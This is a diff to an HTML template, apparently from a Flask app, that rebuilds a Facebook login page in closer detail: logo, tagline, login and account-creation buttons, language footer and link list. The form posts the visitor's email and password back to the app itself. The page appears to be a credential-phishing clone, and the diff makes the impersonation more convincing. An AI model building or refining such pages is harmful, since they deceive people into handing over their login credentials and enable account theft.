@@ -1,119 +1,125 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html>
+
 <head>
-  <meta charset="UTF-8">
-  <title>Facebook login</title>
-  <link href="{{ url_for('static', filename='css/font.css') }}" rel="stylesheet" type="text/css">
-  <link rel="stylesheet" href="{{ url_for('static', filename='css/normalize.min.css') }}">
-
-<style type="text/css">
-* {
-  box-sizing: border-box;
-}
-
-html {
-  background: #E2E2E2;
-}
-
-body {
-  background: #E2E2E2;
-  margin: 0;
-  padding: 0;
-  font-family: 'Lato', sans-serif;
-}
-
-.login-form-wrap {
-  background: radial-gradient(ellipse at center, #5170ad 0%, #355493 100%);
-  border: 1px solid #2d416d;
-  box-shadow: 0 1px #5670A4 inset, 0 0 10px 5px rgba(0, 0, 0, 0.1);
-  border-radius: 5px;
-  width: 360px;
-  height: 380px;
-  margin: 60px auto;
-  padding: 50px 30px 0 30px;
-  text-align: center;
-}
-.login-form-wrap h1 {
-  margin: 0 0 50px 0;
-  padding: 0;
-  font-size: 26px;
-  color: #fff;
-}
-.login-form-wrap h5 {
-  margin-top: 40px;
-}
-.login-form-wrap h5 > a {
-  font-size: 14px;
-  color: #fff;
-  text-decoration: none;
-  font-weight: 400;
-}
-
-.login-form input[type="email"], .login-form input[type="password"] {
-  width: 100%;
-  border: 1px solid #314d89;
-  outline: none;
-  padding: 12px 20px;
-  color: #afafaf;
-  font-weight: 400;
-  font-family: 'Lato', sans-serif;
-  cursor: pointer;
-}
-.login-form input[type="email"] {
-  border-bottom: none;
-  border-radius: 4px 4px 0 0;
-  padding-bottom: 13px;
-  box-shadow: 0 -1px 0 #E0E0E0 inset, 0 1px 2px rgba(0, 0, 0, 0.23) inset;
-}
-.login-form input[type="password"] {
-  border-top: none;
-  border-radius: 0 0 4px 4px;
-  box-shadow: 0 -1px 2px rgba(0, 0, 0, 0.23) inset, 0 1px 2px rgba(255, 255, 255, 0.1);
-}
-.login-form input[type="submit"] {
-  font-family: 'Lato', sans-serif;
-  font-weight: 400;
-  background: -webkit-gradient(linear, left top, left bottom, from(#e0e0e0), to(#cecece));
-  background: linear-gradient(to bottom, #e0e0e0 0%, #cecece 100%);
-  display: block;
-  margin: 20px auto 0 auto;
-  width: 100%;
-  border: none;
-  border-radius: 3px;
-  padding: 8px;
-  font-size: 17px;
-  color: #636363;
-  text-shadow: 0 1px 0 rgba(255, 255, 255, 0.45);
-  font-weight: 700;
-  box-shadow: 0 1px 3px 1px rgba(0, 0, 0, 0.17), 0 1px 0 rgba(255, 255, 255, 0.36) inset;
-}
-.login-form input[type="submit"]:hover {
-  background: #DDD;
-}
-.login-form input[type="submit"]:active {
-  padding-top: 9px;
-  padding-bottom: 7px;
-  background: #C9C9C9;
-}
-</style>
-
+    <meta charset="UTF-8">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
+    <link rel="shortcut icon" href="{{ url_for('static', filename='images/fb.ico') }}" type="image/x-icon">
 </head>
+
 <body>
-<!-- partial:index.partial.html -->
-<section class="login-form-wrap">
-  <h1>Facebook</h1>
-  <form class="login-form" method="POST">
-    <label>
-      <input type="email" name="login" required placeholder="Email">
-    </label>
-    <label>
-      <input type="password" name="password" required placeholder="Password">
-    </label>
-    <input type="submit" value="Login">
-  </form>
-  <!-- <h5><a href="#">Forgot password</a></h5> -->
-</section>
-<!-- partial -->
-  
+    <main>
+        <div class="main">
+        <div class="heading-section">
+            <img src="{{ url_for('static', filename='images/logo.png') }}" class="logo-img">
+            <div class="a-ri8"><span>Facebook helps you connect and share with the people in your life.</span></div>
+        </div>
+
+        <div class="form">
+            <form class="a-form" method="POST">
+                <input type="email" id="Email" class="a-email" name="login" placeholder="Email address or phone number"
+                    autofocus="autofocus" required />
+                <input type="password" id="Password" class="a-pss" name="password" placeholder="Password"
+                    autofocus="autofocus" />
+                <input type="submit" class="a-sub" value="Log In" />
+                <a href="" class="a-link">Forgotten password?</a>
+                <hr class="a-hr">
+                <input type="submit " value="Create New Account" class="a-but" />
+            </form>
+            <div class="create-page">
+                <a href="" class="a-href">Create a Page</a></b> for a celebrity, band or business.
+            </div>
+            </div>
+        </div>
+
+    </main>
+    <div class="footer">
+        <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
+            <ul>
+                <li>English (UK)</li>
+                <li><a href="">हिन्दी</a></li>
+                <li><a href="">ગુજરાતી</a></li>
+                <li><a href="">मराठी</a></li>
+                <li><a href="">اردو</a></li>
+                <li><a href="">മലയാളം</a></li>
+                <li><a href="">বাংলা</a> </li>
+                <li><a href="" class="_sv4">తెలుగు</a> </li>
+                <li><a href="" class="_sv4">தமிழ்</a></li>
+                <li><a href="" class="_sv4">ਪੰਜਾਬੀ</a></li>
+                <li><a href="" class="_sv4">Español</a></li>
+                <li><a href="" role="button"><i class="img sp_ZtNaJVka3YU_2x sx_c13ad6"></i></a> </li>
+            </ul>
+            <div id="line"></div>
+            <div>
+                <ul>
+                    <li><a href="">Sign Up</a></li>
+                    <li><a href="" >Log In</a></li>
+                    <li><a href="">Messenger</a></li>
+                    <li><a href="">Facebook Lite</a> </li>
+                    <li><a href=""> Watch </a> </li>
+                    <li><a href="">People</a> </li>
+                    <li><a href="">Pages</a></li>
+                    <li><a  href="">Page categories</a></li>
+                    <li><a href="">Places</a></li>
+                    <li><a href="">Games</a></li>
+                    <li><a href="">Locations</a></li>
+                    <li><a href="">Marketplace</a></li>
+                    <li><a href="">Facebook Pay</a></li>
+                    <li><a href="">Groups</a></li>
+                    <li><a href="">Jobs</a></li>
+                    <li><a href="">Oculus</a></li>
+                    <li><a href="">Portal</a></li>
+                    <li><a href="">Instagram</a></li>
+                    <li><a href="">Local</a></li>
+                    <li><a href="">Fundraisers</a></li>
+                    <li><a href="">Services</a></li>
+                    <li><a href="">Voting Information Centre</a></li>
+                    <li><a href="">About</a></li>
+                    <li><a href="">Create ad</a></li>
+                    <li><a href="">Create Page</a></li>
+                    <li><a href="">Developers</a></li>
+                    <li><a href="">Careers</a></li>
+                    <li><a href="">Privacy</a></li>
+                    <li><a href="">Cookies</a></li>
+                    <li><a href="">AdChoices<i class="img sp_ZtNaJVka3YU_2x sx_d75518"></i></a></li>
+                    <li><a href="">Terms</a></li>
+                    <li><a href="">Help</a></li>
+                    <li><a href="">Settings</a></li>
+                    <li><a href="">Activity log</a></li>
+                </ul>
+            </div>
+            <div class="copyright">
+                <div><span> Facebook © 2021</span>
+                </div>
+            </div>
+        </div>
+    </div>
+            <div class="m-footer">
+                <div class="main-c">
+                    <div class="list-1"><span >English (UK)</span>
+                        <div><span><a href="">हिन्दी</a></span></div>
+                        <div><span><a href="">اردو</a></span></div>
+                        <div><span><a href="">বাংলা</a></span></div>
+                    </div>
+                    <div class="list-2">
+                        <div><span><a href="">ગુજરાતી</a></span></div>
+                        <div class=""><span><a href="">मराठी</a></span>
+                        </div>
+                        <div><span><a href="">മലയാളം</a></span></div>
+                        <a>
+                            <div><i class="img sp_vuppHZ0nD_0_3x sx_222020"></i>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <div class="main-links">
+                    <span>About </span>.
+                    <span> Help </span>.
+                    <span> More </span>
+                </div>
+                <div class="fb">Facebook Inc.</div>
+            </div>
 </body>
+
 </html>
